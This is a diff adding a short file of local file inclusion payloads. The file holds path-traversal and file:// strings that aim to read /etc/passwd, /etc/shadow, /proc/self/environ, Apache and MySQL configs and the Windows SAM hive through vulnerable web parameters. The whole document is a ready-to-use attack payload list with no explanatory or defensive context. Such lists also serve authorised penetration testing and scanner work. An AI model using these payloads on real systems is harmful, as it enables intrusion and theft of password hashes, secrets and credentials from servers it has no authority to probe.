@@ -1,0 +1,13 @@
+# Local File Inclusion (LFI) Payloads
+../../../etc/passwd
+../../../etc/hosts
+../../../etc/apache2/apache2.conf
+../../../etc/mysql/my.cnf
+../../../proc/self/environ
+../../../proc/version
+/etc/passwd
+/etc/shadow
+/etc/hosts
+file:///etc/passwd
+..\\..\\..\\windows\\win.ini
+..\\..\\..\\windows\\system32\\config\\sam
